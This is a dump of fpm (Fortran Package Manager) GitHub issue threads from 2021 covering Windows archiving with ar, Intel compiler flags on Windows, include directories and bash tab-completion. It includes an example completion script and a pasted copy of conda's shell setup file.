                    "text": "My first reaction was to write \"they are incompatible\", but a quick check\nshowed that the same file structure is used. I listed the contents of a\nlibrary file that was created with the Intel compiler on Windows using\nVisual Studio, in a Cygwin command window, using ar. No problem.\n\nThat said, I am pretty sure that you cannot mix object files created by\ncompilers that have not been set up to be compatible with each other.\n\nOp za 13 mrt. 2021 om 00:04 schreef Sebastian Ehlert <\n***@***.***>:\n\u2026\n It might also depend on the availability of MinGW or Cygwin type\n libraries. I would be interested in how compatible an archive created by\n link.exe is on a Cygwin Posix layer. For the setup we have on the GitHub\n Windows runner there is a wild mixture of MSYS2, git-bash and choco\n packages in the PATH, not sure which of them is providing the ar binary\n we are using to create the archive.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#384 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR2DPCTOTKYZKW3C47LTDKMYXANCNFSM4ZDCEOLQ>\n ."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-03-18 16:09:29+00:00",
                    "text": "Started looking into this a bit, and it appears msys/mingw do have ar available, but cmd and git Bash do not. Right now our set of os types only distinguishes between OS_CYGWIN and OS_WINDOWS. It seems we should have OS_WINDOWS_CMD, OS_WINDOWS_GIT_BASH and OS_WINDOWS_MINGW.\nUnfortunately it seems we will be unlikely to distinguish based on environment variables alone (at least the ones we're currently checking).\n\n\n\nEnvironment\nOS\nOSTYPE\n\n\n\n\nCMD\nWindows_NT\nN/A\n\n\ngit Bash\nWindows_NT\nmsys\n\n\nMinGW\nWindows_NT\nmsys\n\n\n\nAny thoughts on how to distinguish between git Bash and MinGW? Any thoughts on the names of the variables? Would OS_CMD, OS_GIT_BASH and OS_MINGW be sufficient or is that not explicit enough?"
                },
                {
                    "user": "arjenmarkus",
                    "date": "2021-03-19 08:44:40+00:00",
                    "text": "Plain MinGW-w64/MSYS2 command windows define an  environment variable\nMSYSTEM: the values are MINGW32, MINGW64 and MSYS2 for the three flavours.\n\nGit bbash seems to be based on MinGW-w64/MSYS2, so you cannot distinguish\nit from plain MinGW.\n\nOp do 18 mrt. 2021 om 17:09 schreef Brad Richardson <\n***@***.***>:\n\u2026\n Started looking into this a bit, and it appears msys/mingw do have ar\n available, but cmd and git Bash do not. Right now our set of os types only\n distinguishes between OS_CYGWIN and OS_WINDOWS. It seems we should have\n OS_WINDOWS_CMD, OS_WINDOWS_GIT_BASH and OS_WINDOWS_MINGW.\n\n Unfortunately it seems we will be unlikely to distinguish based on\n environment variables alone (at least the ones we're currently checking).\n Environment OS OSTYPE\n CMD Windows_NT N/A\n git Bash Windows_NT msys\n MinGW Windows_NT msys\n\n Any thoughts on how to distinguish between git Bash and MinGW? Any\n thoughts on the names of the variables? Would OS_CMD, OS_GIT_BASH and\n OS_MINGW be sufficient or is that not explicit enough?\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#384 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR3NQ4DSN4DHL4MDX2LTEIQU5ANCNFSM4ZDCEOLQ>\n ."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-04-08 20:14:10+00:00",
                    "text": "My initial thought was that we would detect the environment and base our decision off that. But now I think we should just see if ar works, if so use it, if not try link -lib, and just fail if that one doesn't work. I'll try and see if we can tell from execute_command_line what works."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-04-08 20:34:26+00:00",
                    "text": "I tried executing the following on each OS, and checking the values of exitstat and cmdstat for each. Here's what I found.\n\nNote: I did install something on Windows that put ar in my path on cmd prompt\n\n\n\n\ncommand\nLinux\nMacOS\nWindows\n\n\n\n\nar\nexitstat=1, cmdstat=0\nexitstat=1, cmdstat=0\nexitstat=1, cmdstat=0\n\n\nar --version\nexitstat=0, cmdstat=0\nexitstat=0, cmdstat=0 *\nexitstat=0, cmdstat=0\n\n\narr\nexitstat=127, cmdstat=3\nexitstat=127, cmdstat=3\nexitstat=1, cmdstat=0\n\n\n\n\nNote: ar on MacOS does not support --version, so running the command ar --version actually gives exitstat=1\n\nMy conclusion then is that, only on Windows should we do the check for ar, other platforms can just assume it will be present. And if ar isn't found based exitstat from the command ar --version, we just assume link -lib will work.\nI will implement the above (probably in constructing the model?) and try to test it out."
                }
            ]
        },
        {
            "number": 383,
            "user": "everythingfunctional",
            "date": "2021-03-12 22:17:25+00:00",
            "title": "Default flags do not work for Intel on Windows",
            "text": "The default flags do not work for ifort on Windows. I get:\nifort: command line error: Unrecognized keyword 'all:noarg_temp_created' for option '/check'",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2021-03-12 22:21:28+00:00",
                    "text": "Follow up, running with the --release option kinda works, in that it will compile stuff, but it complains about ignoring unknown options:\nifort: command line warning #10159: invalid argument for option '/fp'\nifort: command line warning #10161: unrecognized source type 'precise'; object file assumed\nifort: command line warning #10006: ignoring unknown option '/pc'\nifort: command line warning #10161: unrecognized source type '64'; object file assumed\nifort: command line warning #10161: unrecognized source type 'all'; object file assumed\nifort: command line warning #10155: ignoring option '/error-limit'; argument required\nifort: command line warning #10161: unrecognized source type '1'; object file assumed\nifort: command line warning #10161: unrecognized source type 'threaded'; object file assumed\nifort: command line warning #10155: ignoring option '/assume'; argument required\nifort: command line warning #10161: unrecognized source type 'byterecl'; object file assumed\nifort: command line warning #10155: ignoring option '/module'; argument required\nifort: command line warning #10161: unrecognized source type 'build\\ifort_release\\hello_fpm'; object file assumed"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-12 22:23:47+00:00",
                    "text": "Intel on Windows is using MSVS compatible syntax rather than GCC compatible syntax for the option and is usually considered a \u201cdifferent\u201d compiler than Intel on Unix (meson has different identifiers and different defaults for them)."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-15 18:08:19+00:00",
                    "text": "So the most obvious question is should there just be another select case added with a different name like \"ifort-msvs\" or should the compiler name \"ifort\" work and something like the OS_TYPE() routine select Microsoft or Unix-Like switches  (or is there some way to allow the Microsoft version to accept the Unix syntax?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-03-15 18:15:03+00:00",
                    "text": "I think we want the name \"ifort\" to still work, and then use the OS_TYPE to select the set of switches for the current OS.\nNote that it's not just the syntax that's different. The Intel compiler legitimately has a different set of available options for different OSes. In fact, with this fix we could add -coarray=single back to the default set for Linux, while leaving it off for Mac."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-15 21:24:56+00:00",
                    "text": "That's a good justification for going the OS_TYPE() route. Seems cleaner. On the other side of that, might it be confusing to use the same name and get different results on different platforms?   I think I like the OS_TYPE() approach the best, but a little hesitant;  but do not like taking a \"good\" default off the Linux options because not all platforms support it either."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-03-15 23:35:36+00:00",
                    "text": "I'd argue that Intel are the ones who gave it the same name and get different results on different platforms. I think as far fpm is concerned, we want things to \"just work\" for as many people on as many platforms as possible. Somebody who was able to do fpm run --compiler ifort on one platform should be able to run the exact same command on another and expect it to work."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-04-09 01:57:07+00:00",
                    "text": "Fixed by #431"
                }
            ]
        },
        {
            "number": 382,
            "user": "Beliavsky",
            "date": "2021-03-11 16:17:16+00:00",
            "title": "Add a rationale to Readme.md",
            "text": "Make has existed for decades, and many Fortran GitHub projects use CMake, which creates make files.  FPM may exist because of perceived deficiencies in make and CMake. I suggest that the Readme.md explain how FPM is intended to be better. I have trouble using CMake on Windows. I guess part of the rationale of FPM is to make the build process equally easy on all platforms.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-03-11 22:11:30+00:00",
                    "text": "fpm does do a very good job of building quite complex layouts of programs while largely masking the differences between different compilers (for straight-forward loads); but it also allows you to use external packages, which you would have to build your own rules with with make(1), for example. Even in the alpha stage if you showed a split screen showing how to set up a project using fpm(1) and Cmake(1) (let alone make(1)) I think fpm would look very appealing. The strongest case for make(1) is that it easily integrates with external packages in true \"Unix toolkit\" fashion; but new users in particular can be using Fortran via fpm long before they have read the man-pages for their compiler, learning how to build and load from libraries, and finding, pulling and building external packages and using make(1) don't you think?"
                },
                {
                    "user": "vmagnin",
                    "date": "2021-03-12 07:31:41+00:00",
                    "text": "Comparing with the powerful and complex CMake, fpm is user friendly like https://mesonbuild.com/\n\nMeson is an open source build system meant to be both extremely fast, and, even more importantly, as user friendly as possible.\nThe main design point of Meson is that every moment a developer spends writing or debugging build definitions is a second wasted. So is every second spent waiting for the build system to actually start compiling code."
                }
            ]
        },
        {
            "number": 381,
            "user": "Beliavsky",
            "date": "2021-03-10 05:04:32+00:00",
            "title": "jchristopherson packages",
            "text": "A GitHub contributor jchristopherson has created a number of packages, under the GPL-3.0 License, that use Modern Fortran, including type-bound procedures, and that are of general applicability:\nintegral\nmeasurements\nfplot\ncore\nmecheng\nnonlin\nlinalg\nfortio\ncurvefit\ncollections\nferror\nstrings\nI am able to compile them under WSL. They would be nice to have as packages in FPM, and maybe some functionality can be in stdlib.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-03-10 20:38:19+00:00",
                    "text": "@Beliavsky I can only encourage to fork the projects you are interested in, add an fpm package manifest and maybe submit a patch back to the upstream repository."
                }
            ]
        },
        {
            "number": 378,
            "user": "urbanjost",
            "date": "2021-03-07 22:30:23+00:00",
            "title": "Add ford-compatible documentation to fpm_strings.f90",
            "text": "Added or updated documentation compatible with ford(1) for src/fpm_strings.f90\nChanges are restricted to comment changes.",
            "comments": []
        },
        {
            "number": 377,
            "user": "LKedward",
            "date": "2021-03-07 12:11:33+00:00",
            "title": "Add explicit include-dir key to manifest",
            "text": "A minimal set of changes towards improved support for include/#include statements (related: #358).\n\nProposes a new manifest key include-dir in the [library] table which allows specifying a directory to pass to the compiler as an include directory (i.e. -Iinclude).\n\nThis allows included .f90 files to be stored separately to compilable sources so that fpm won't try to compile them.\n\n\nThe default value of include-dir is \"include\" which is ignored if the directory doesn't exist.\nA package contains a library if it contains either the source-dir or the include-dir or both\n\nThis caters for 'header-only' libraries (useful for defining interfaces, preprocesser macros and inlinable routines)\n\n\n\nNot addressed in this PR (#358):\n\nTracking module dependencies in include files\nDetecting changes in include files for incremental compilation",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2021-03-18 16:09:05+00:00",
                    "text": "Is this PR expected to also work for including pre-built module files?\nSpecifically, I'm trying to use this to build a program with NetCDF as a dependency. A system-provided netcdf.mod is in /usr/include. Here's my fpm.toml:\nname = \"umwm\"\n\n[library]\nsource-dir = \"staging\"\ninclude-dir = \"/usr/include\"\n\n[build]\nlink = \"netcdff\"\n\nBut I get the error during fpm build:\n...\nUnable to find source for module dependency: \"netcdf\" used by \"././staging/umwm_io.f90\"\nERROR STOP 1\n...\n\nIs the problem perhaps that fpm tries to look for the source file that provides the netcdf module?\nCompiler options are:\n <INFO>COMPILER OPTIONS:   -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -fcoarray=single  -J build/gfortran_debug/umwm -I build/gfortran_debug/umwm\n\nSo it doesn't look like the path I provided in include-dir was passed to compiler options.\nOr am I not setting it up correctly?"
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-18 16:28:20+00:00",
                    "text": "Is this PR expected to also work for including pre-built module files?\n\nNo, this PR isn't targeting this use-case specifically, but you are right that this is only limited by the fact that fpm tries to identify a source file all modules used. We could loosen this check to only print a warning if the module source file isn't contained within the project and then your example will work. I think your use case should be discussed separately to this PR; using external mod files isn't ideal for fpm IMO, but I guess it can't be avoided for packages like netcdf.\nLooks like I also just need to update the compiler options output to run after processing the manifest."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-03-18 16:42:48+00:00",
                    "text": "Sounds good, in that case, let's just add a note to the manifest reference that this for the time being won't work for pre-built modules."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-24 09:27:56+00:00",
                    "text": "Thanks for reviewing, I will now merge."
                }
            ]
        },
        {
            "number": 375,
            "user": "brocolis",
            "date": "2021-03-02 12:33:17+00:00",
            "title": "Run tests in specified order",
            "text": "It took me a while to see the test itself is correct, but the commands are not being executed in specified order. I am using the master branch.",
            "comments": []
        },
        {
            "number": 374,
            "user": "ivan-pi",
            "date": "2021-03-01 11:13:26+00:00",
            "title": "Command-line completion",
            "text": "At some point it would be nice to give fpm command line completion capabilities (like git or other command-line programs).\nAn example of what the command-completion scripts look like in git can be found here: https://github.com/git/git/tree/328c10930387d301560f7cbcd3351cc485a13381/contrib/completion\nA more gentle introduction can be found in various online tutorials, e.g.: https://iridakos.com/programming/2018/03/01/bash-programmable-completion-tutorial",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-03-01 14:39:05+00:00",
                    "text": "bash-shell completion scripts (using complete(1) and compgen(1))  would be very nice, and bash is almost ubiquitous except for some MSWindows environments.  It could proceed as a separate project and not require code changes, just a stable CLI interface to describe. So it seems like a great idea.\nBut I was wondering what prompted the desire, as maybe there are a few other changes to fpm(1) that would help even in the DOS Programming Environment. Assuming it might be the long descriptive keywords\n\n\nwould short names for the command options help, so you could enter \"fpm run -EL -R 'ls -l'\" instead of \"fpm run --example --list --runner 'ls -l'?\n\n\nwould something like response files, as described in the  M_CLI2 documentation be useful?  That was actually for possible use by fpm as proposed by @awvwgk ;  but it is not activated and might need some tweeking.  As-is you can make abbreviations for your favorite commands and  then enter \"fpm @itest\"  instead of \"fpm test --compiler ifort --runner time\" and so on. It should be relatively platform independent as well.\n\n\nI am not a big user of complete and compgen  so I am not sure if it is remotely feasible but I am wondering if a CLI parser like M_CLI2,  FLAP,  kracken, getopt_long_options , ...  can generate at least the beginnings of a  bash command completion script.  If it could, that seems like a nice idea for adding to M_CLI2."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-03-01 15:14:05+00:00",
                    "text": "But I was wondering what prompted the desire, as maybe there are a few other changes to fpm(1) that would help even in the DOS Programming Environment. Assuming it might be the long descriptive keywords\n\nI don't really have a full concept for what type of completions.\nMy favorite would be if fpm build <tab><tab> would list the available targets. Currently whenever I forget the name of my build targets I have to do:\nfpm build --list\nfpm build <my_target>\n\nIt might also be nice to have simple command completions like fpm b<tab> to list commands starting with b.\nI also like how git <tab><tab> lists the available subcommands. I think it would be nice if fpm <tab><tab> would do the same.\nOn the other hand fpm<tab><tab> (no space) could be saved for listing plugins like fpm-search and other future programs."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-01 16:48:02+00:00",
                    "text": "I don't think the targets can be listed by bash completion like a pathname could, but in the current release if you enter a name you know does not exist  for run you get a compact list of basenames. In a proposed PR #370\nyou can enter quoted glob strings like\nfpm run '*' \nfpm run '*demo*'\n\nfor run and test targets and on the --list argument and (if there is more than one target) you get a list of the basenames.  Using <tab><tab> in the program itself as an alias for that would probably get trapped by people using completion;  but  have been thinking that \".\"  might be an alias for \"'*'\".  There is also a --all switch but I am not sure if that is generally supported or not, but it lets you easily do what is the default now without using \"special\" characters like an asterisk (hence thinking about allowing \".\" and removing --all).  It sounds like those changes help with the problems.\nWas thinking of allowing for a menu more like autocompletion but did not add it as\nas in the discussions it came up that something fancier that would be free (to a greater extent, anyway) to use things like ncurses or shell commands would probably be done better with a plug-in like fpm-search can be used in #364(?).\nNote the only auto completion I know of is in the OS or shell, not directly in the programs; but I have not looked that hard."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-03-01 16:56:08+00:00",
                    "text": "I know of one command line parser (for a different language) that has bash completion built in: optparse-applicative. This is actually what I had used for the Haskell implementation, but hadn't turned on the bash completion. So there is precedent for having the bash-completion built in. I don't know all of the intricacies with how bash completion works though, so not sure how difficult it is."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-01 17:16:54+00:00",
                    "text": "Just what I was thinking from what I can tell so far;  but more involved than I hoped.  Looks like adding something that would just expand keywords and filenames for a regular command would be relatively straight-forward; but doing it with subcommands with M_CLI2 as it currently works totally automatically seems complicated.  Maybe writing a program to take in a description of the form cmd [a|b|c]|[--help|--version]  like is often in help text (at least in man-pages) would be generically useful.  Some interesting possibilities.  Unfortunately not trivial ones.  At least, not for automating generation of the files.  The original proposal seems like the better plan for the foreseeable future."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-02 10:14:29+00:00",
                    "text": "A quick and dirty bash completion demo for fpm targets based on this answer.\n\n  \n    \n    \n\n    fpm_bash_completion-2021-03-02_10.08.25.mp4\n    \n  \n\n  \n\n  \n\n\n\n#!/usr/bin/env bash\n#\n#\n\n_fpm_run_completion() {\n_opts=$(ffpm build --list 2>&1 | grep app | grep -v '\\.' | cut -d/ -f4|tr '\\n' ' ')\nCOMPREPLY=()\ncur=\"${COMP_WORDS[COMP_CWORD]}\"\nCOMPREPLY=( $( compgen -W \"${_opts}\" -- ${cur} ))\nreturn 0\n}\n\ncomplete -F _fpm_run_completion fpm run"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-03-02 10:39:32+00:00",
                    "text": "Cool! I would need a day to understand how or why that bash scripts works \ud83d\ude02. (hopefully we can find some reviewers for PR's)\nHow does one ship such a bash-completion script?"
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-02 10:50:06+00:00",
                    "text": "How does one ship such a bash-completion script?\n\nI imagine this is where system package managers become useful, though I know very little about distribution best-practices. The next best option may be to have the install.sh script copy the completion scripts to the correct system location"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-02 10:58:03+00:00",
                    "text": "For Unix there are two possibilities:\n\nsourcing a script at startup, this is usually placed in /etc/profile.d\nRunning eval \"$(fpm bashcompletion)\" at shell startup, where fpm-bashcompletion might be a plugin or fpm intrinsic to print the required bash functions"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-03-02 11:18:09+00:00",
                    "text": "Perhaps slightly tangential, but the Conda installer (or conda init command) typically add a section similar to this one to the ~/.bashrc settings:\n# >>> conda initialize >>>\n# !! Contents within this block are managed by 'conda init' !!\n__conda_setup=\"$('/opt/miniconda3/bin/conda' 'shell.bash' 'hook' 2> /dev/null)\"\nif [ $? -eq 0 ]; then\n    eval \"$__conda_setup\"\nelse\n    if [ -f \"/opt/miniconda3/etc/profile.d/conda.sh\" ]; then\n        . \"/opt/miniconda3/etc/profile.d/conda.sh\"\n    else\n        export PATH=\"/opt/miniconda3/bin:$PATH\"\n    fi\nfi\nunset __conda_setup\n# <<< conda initialize <<<\n(For system wide installations a symlink can be made instead like sudo ln -s /opt/conda/etc/profile.d/conda.sh /etc/profile.d/conda.sh):\nThe purpose is the following:\nExpand\nKey parts of conda's functionality require that it interact directly with the shell\nwithin which conda is being invoked. The `conda activate` and `conda deactivate` commands\nspecifically are shell-level commands. That is, they affect the state (e.g. environment\nvariables) of the shell context being interacted with. Other core commands, like\n`conda create` and `conda install`, also necessarily interact with the shell environment.\nThey're therefore implemented in ways specific to each shell. Each shell must be configured\nto make use of them.\n\nThis command makes changes to your system that are specific and customized for each shell.\nTo see the specific files and locations on your system that will be affected before, use the\n'--dry-run' flag.  To see the exact changes that are being or will be made to each location,\nuse the '--verbose' flag.\n\nIMPORTANT: After running `conda init`, most shells will need to be closed and restarted\n           for changes to take effect.\n\n\nThe contents of the file /opt/miniconda3/etc/profile.d/conda.sh are:\nExpand\nexport CONDA_EXE='/opt/miniconda3/bin/conda'\nexport _CE_M=''\nexport _CE_CONDA=''\nexport CONDA_PYTHON_EXE='/opt/miniconda3/bin/python'\n\n# Copyright (C) 2012 Anaconda, Inc\n# SPDX-License-Identifier: BSD-3-Clause\n\n__add_sys_prefix_to_path() {\n    # In dev-mode CONDA_EXE is python.exe and on Windows\n    # it is in a different relative location to condabin.\n    if [ -n \"${_CE_CONDA}\" ] && [ -n \"${WINDIR+x}\" ]; then\n        SYSP=$(\\dirname \"${CONDA_EXE}\")\n    else\n        SYSP=$(\\dirname \"${CONDA_EXE}\")\n        SYSP=$(\\dirname \"${SYSP}\")\n    fi\n\n    if [ -n \"${WINDIR+x}\" ]; then\n        PATH=\"${SYSP}/bin:${PATH}\"\n        PATH=\"${SYSP}/Scripts:${PATH}\"\n        PATH=\"${SYSP}/Library/bin:${PATH}\"\n        PATH=\"${SYSP}/Library/usr/bin:${PATH}\"\n        PATH=\"${SYSP}/Library/mingw-w64/bin:${PATH}\"\n        PATH=\"${SYSP}:${PATH}\"\n    else\n        PATH=\"${SYSP}/bin:${PATH}\"\n    fi\n    \\export PATH\n}\n\n__conda_hashr() {\n    if [ -n \"${ZSH_VERSION:+x}\" ]; then\n        \\rehash\n    elif [ -n \"${POSH_VERSION:+x}\" ]; then\n        :  # pass\n    else\n        \\hash -r\n    fi\n}\n\n__conda_activate() {\n    if [ -n \"${CONDA_PS1_BACKUP:+x}\" ]; then\n        # Handle transition from shell activated with conda <= 4.3 to a subsequent activation\n        # after conda updated to >= 4.4. See issue #6173.\n        PS1=\"$CONDA_PS1_BACKUP\"\n        \\unset CONDA_PS1_BACKUP\n    fi\n\n    \\local cmd=\"$1\"\n    shift\n    \\local ask_conda\n    CONDA_INTERNAL_OLDPATH=\"${PATH}\"\n    __add_sys_prefix_to_path\n    ask_conda=\"$(PS1=\"$PS1\" \"$CONDA_EXE\" $_CE_M $_CE_CONDA shell.posix \"$cmd\" \"$@\")\" || \\return $?\n    rc=$?\n    PATH=\"${CONDA_INTERNAL_OLDPATH}\"\n    \\eval \"$ask_conda\"\n    if [ $rc != 0 ]; then\n        \\export PATH\n    fi\n    __conda_hashr\n}\n\n__conda_reactivate() {\n    \\local ask_conda\n    CONDA_INTERNAL_OLDPATH=\"${PATH}\"\n    __add_sys_prefix_to_path\n    ask_conda=\"$(PS1=\"$PS1\" \"$CONDA_EXE\" $_CE_M $_CE_CONDA shell.posix reactivate)\" || \\return $?\n    PATH=\"${CONDA_INTERNAL_OLDPATH}\"export CONDA_EXE='/opt/miniconda3/bin/conda'\nexport _CE_M=''\nexport _CE_CONDA=''\nexport CONDA_PYTHON_EXE='/opt/miniconda3/bin/python'\n\n# Copyright (C) 2012 Anaconda, Inc\n# SPDX-License-Identifier: BSD-3-Clause\n\n__add_sys_prefix_to_path() {\n    # In dev-mode CONDA_EXE is python.exe and on Windows\n    # it is in a different relative location to condabin.\n    if [ -n \"${_CE_CONDA}\" ] && [ -n \"${WINDIR+x}\" ]; then\n        SYSP=$(\\dirname \"${CONDA_EXE}\")\n    else\n        SYSP=$(\\dirname \"${CONDA_EXE}\")\n        SYSP=$(\\dirname \"${SYSP}\")\n    fi\n\n    if [ -n \"${WINDIR+x}\" ]; then\n        PATH=\"${SYSP}/bin:${PATH}\"\n        PATH=\"${SYSP}/Scripts:${PATH}\"\n        PATH=\"${SYSP}/Library/bin:${PATH}\"\n        PATH=\"${SYSP}/Library/usr/bin:${PATH}\"\n        PATH=\"${SYSP}/Library/mingw-w64/bin:${PATH}\"\n        PATH=\"${SYSP}:${PATH}\"\n    else\n        PATH=\"${SYSP}/bin:${PATH}\"\n    fi\n    \\export PATH\n}\n\n__conda_hashr() {\n    if [ -n \"${ZSH_VERSION:+x}\" ]; then\n        \\rehash\n    elif [ -n \"${POSH_VERSION:+x}\" ]; then\n        :  # pass\n    else\n        \\hash -r\n    fi\n}\n\n__conda_activate() {\n    if [ -n \"${CONDA_PS1_BACKUP:+x}\" ]; then\n        # Handle transition from shell activated with conda <= 4.3 to a subsequent activation\n        # after conda updated to >= 4.4. See issue #6173.\n        PS1=\"$CONDA_PS1_BACKUP\"\n        \\unset CONDA_PS1_BACKUP\n    fi\n\n    \\local cmd=\"$1\"\n    shift\n    \\local ask_conda\n    CONDA_INTERNAL_OLDPATH=\"${PATH}\"\n    __add_sys_prefix_to_path\n    ask_conda=\"$(PS1=\"$PS1\" \"$CONDA_EXE\" $_CE_M $_CE_CONDA shell.posix \"$cmd\" \"$@\")\" || \\return $?\n    rc=$?\n    PATH=\"${CONDA_INTERNAL_OLDPATH}\"\n    \\eval \"$ask_conda\"\n    if [ $rc != 0 ]; then\n        \\export PATH\n    fi\n    __conda_hashr\n}\n\n__conda_reactivate() {\n    \\local ask_conda\n    CONDA_INTERNAL_OLDPATH=\"${PATH}\"\n    __add_sys_prefix_to_path\n    ask_conda=\"$(PS1=\"$PS1\" \"$CONDA_EXE\" $_CE_M $_CE_CONDA shell.posix reactivate)\" || \\return $?\n    PATH=\"${CONDA_INTERNAL_OLDPATH}\"\n    \\eval \"$ask_conda\"\n    __conda_hashr\n}\n\nconda() {\n    if [ \"$#\" -lt 1 ]; then\n        \"$CONDA_EXE\" $_CE_M $_CE_CONDA\n    else\n        \\local cmd=\"$1\"\n        shift\n        case \"$cmd\" in\n            activate|deactivate)\n                __conda_activate \"$cmd\" \"$@\"\n                ;;\n            install|update|upgrade|remove|uninstall)\n                CONDA_INTERNAL_OLDPATH=\"${PATH}\"\n                __add_sys_prefix_to_path\n                \"$CONDA_EXE\" $_CE_M $_CE_CONDA \"$cmd\" \"$@\"\n                \\local t1=$?\n                PATH=\"${CONDA_INTERNAL_OLDPATH}\"\n                if [ $t1 = 0 ]; then\n                    __conda_reactivate\n                else\n                    return $t1\n                fi\n                ;;\n            *)\n                CONDA_INTERNAL_OLDPATH=\"${PATH}\"\n                __add_sys_prefix_to_path\n                \"$CONDA_EXE\" $_CE_M $_CE_CONDA \"$cmd\" \"$@\"\n                \\local t1=$?\n                PATH=\"${CONDA_INTERNAL_OLDPATH}\"\n                return $t1\n                ;;\n        esac\n    fi\n}\n\nif [ -z \"${CONDA_SHLVL+x}\" ]; then\n    \\export CONDA_SHLVL=0\n    # In dev-mode CONDA_EXE is python.exe and on Windows\n    # it is in a different relative location to condabin.\n    if [ -n \"${_CE_CONDA+x}\" ] && [ -n \"${WINDIR+x}\" ]; then\n        PATH=\"$(\\dirname \"$CONDA_EXE\")/condabin${PATH:+\":${PATH}\"}\"\n    else\n        PATH=\"$(\\dirname \"$(\\dirname \"$CONDA_EXE\")\")/condabin${PATH:+\":${PATH}\"}\"\n    fi\n    \\export PATH\n\n    # We're not allowing PS1 to be unbound. It must at least be set.\n    # However, we're not exporting it, which can cause problems when starting a second shell\n    # via a first shell (i.e. starting zsh from bash).\n    if [ -z \"${PS1+x}\" ]; then\n        PS1=\n    fi\nfi\n\n    \\eval \"$ask_conda\"\n    __conda_hashr\n}\n\nconda() {\n    if [ \"$#\" -lt 1 ]; then\n        \"$CONDA_EXE\" $_CE_M $_CE_CONDA\n    else\n        \\local cmd=\"$1\"\n        shift\n        case \"$cmd\" in\n            activate|deactivate)\n                __conda_activate \"$cmd\" \"$@\"\n                ;;\n            install|update|upgrade|remove|uninstall)\n                CONDA_INTERNAL_OLDPATH=\"${PATH}\"\n                __add_sys_prefix_to_path\n                \"$CONDA_EXE\" $_CE_M $_CE_CONDA \"$cmd\" \"$@\"\n                \\local t1=$?\n                PATH=\"${CONDA_INTERNAL_OLDPATH}\"\n                if [ $t1 = 0 ]; then\n                    __conda_reactivate\n                else\n                    return $t1\n                fi\n                ;;\n            *)\n                CONDA_INTERNAL_OLDPATH=\"${PATH}\"\n                __add_sys_prefix_to_path\n                \"$CONDA_EXE\" $_CE_M $_CE_CONDA \"$cmd\" \"$@\"\n                \\local t1=$?\n                PATH=\"${CONDA_INTERNAL_OLDPATH}\"\n                return $t1\n                ;;\n        esac\n    fi\n}\n\nif [ -z \"${CONDA_SHLVL+x}\" ]; then\n    \\export CONDA_SHLVL=0\n    # In dev-mode CONDA_EXE is python.exe and on Windows\n    # it is in a different relative location to condabin.\n    if [ -n \"${_CE_CONDA+x}\" ] && [ -n \"${WINDIR+x}\" ]; then\n        PATH=\"$(\\dirname \"$CONDA_EXE\")/condabin${PATH:+\":${PATH}\"}\"\n    else\n        PATH=\"$(\\dirname \"$(\\dirname \"$CONDA_EXE\")\")/condabin${PATH:+\":${PATH}\"}\"\n    fi\n    \\export PATH\n\n    # We're not allowing PS1 to be unbound. It must at least be set.\n    # However, we're not exporting it, which can cause problems when starting a second shell\n    # via a first shell (i.e. starting zsh from bash).\n    if [ -z \"${PS1+x}\" ]; then\n        PS1=\n    fi\nfi"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-02 11:22:45+00:00",
                    "text": "Conda is a quite particular case because it tries to modify variables like PS1 to display a modified prompt and such."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-02 12:04:41+00:00",
                    "text": "For Unix there are two possibilities:\n\nsourcing a script at startup, this is usually placed in /etc/profile.d\nRunning eval \"$(fpm bashcompletion)\" at shell startup, where fpm-bashcompletion might be a plugin or fpm intrinsic to print the required bash functions\n\n\ngit has a script placed in /usr/share/bash-completion/completions/ (on Ubuntu) \u2014 can we do something similar (given root permissions), or is this not recommended?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-02 12:17:22+00:00",
                    "text": "If we get with fpm ever installed in the system prefix this would be preferable, otherwise we should place the completion on install at $PREFIX/share/bash-completion/completions, this would be possible with an extra manifest entry in the install table."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-02 12:42:05+00:00",
                    "text": "for reference\n/etc/bash_completion.d/ is a directory on Red Hat specifically for an admin to put completion scripts.\nAlong the lines mentioned, a plugin command like  fpm-bash could probably customize the environment without changing user prologue files or installing files and spawn a subshell, but would therefore require repeated use instead of a \"one-time\" setup. Did not actually try it, but something platform-specific could be a plugin written in any language so I think it could just be a bash script."
                }
            ]
        },
        {
            "number": 372,
            "user": "urbanjost",
            "date": "2021-02-24 00:34:37+00:00",
            "title": "close #371",
